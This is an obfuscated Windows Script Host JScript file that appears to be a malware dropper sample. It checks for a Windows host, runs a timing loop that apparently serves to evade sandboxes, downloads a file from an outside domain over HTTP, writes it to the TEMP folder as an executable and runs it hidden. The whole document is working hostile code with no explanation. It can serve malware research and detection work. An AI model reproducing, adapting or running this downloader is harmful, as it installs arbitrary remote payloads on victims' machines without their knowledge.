var Rw = false;
var k = "CreateObject";
var et = function s() {return WScript[k]("WScript.Shell");}(), zk = 11;
var J = "MSXML2.XMLHTTP";
var u0 = 2123213;
var uc = 0;
function Kk(A){et["Run"](A, uc, uc);};
function R(){return "" + J;};
function Ha(C, yJ){uc = uc * 1; return C - yJ;};
function sz(){return k;};
/*@cc_on
  @if (@_win32 || @_win64)
    Rw = true;
  @end
@*/
if (Rw)
{
var My = "";
function D(){return 22;};
var m = 0; var q = 0;
function ul()
{
var B = new this["Date"]();
var bw = B["getUTCMilliseconds"]();
WScript["Sleep"](D());
var B = new this["Date"]();
var j = B["getUTCMilliseconds"]();
WScript["Sleep"](D());
var B = new this["Date"]();
var l = B["getUTCMilliseconds"]();
var m = "Ag";
m = Ha(j, bw);
var q = "g";
q = Ha(l, j);
My = "open";
return Ha(m, q);
}
var f = false;
var rh = false;
for (var pw = uc; pw < D() * 1; pw++){if (ul() != uc){
f = true; 
q = "31" + 11 * m + q; 
rh = true; 
break;
}}
function n() {return ((f == true) && (f == rh)) ? 1 : uc;};
if (f && n() && rh){
function Xy() {return et["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "pGAmDPTywMKT.exe";};
 Gd = R();
 Sk = WScript[k](Gd);
 var tn = 1;
 while (tn){
try {
Sk[My]("GET", "http://refindsexy.com/i8eps", false);
Sk["send"]();
BN = "Sleep";
for (;;){WScript[BN](D() * 11); if (Sk["readystate"] >= 2 * 2) break;};
tn = uc;
} catch(w){};
}
function W(DP) {var u = (1, 2, 3, 4, 5, DP); return u;};
Jl = WScript[sz()]("ADODB.Stream");
Gd = Jl;
Gd[My]();
Gd["type"] = W(1);
Gd["write"](Sk["ResponseBody"]);
Jl["position"] = W(uc);
Gd["Save" + "ToFile"](Xy(), 2);
Jl["c"+"lose"]();
dL = Xy();
Kk(dL);
}
}

